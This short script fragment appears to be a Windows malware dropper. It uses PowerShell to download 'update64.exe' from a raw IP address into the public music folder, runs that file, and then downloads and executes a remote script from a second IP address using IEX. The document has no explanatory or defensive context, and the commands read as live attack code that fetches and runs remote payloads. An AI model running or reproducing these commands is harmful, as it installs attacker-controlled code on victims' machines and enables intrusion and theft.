start powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://23.227.202.28/temp/update64.exe','C:\users\public\music\update64.exe')"
start C:\users\public\music\update64.exe
IEX ((new-object net.webclient).downloadstring('http://89.45.4.169:80/buf'))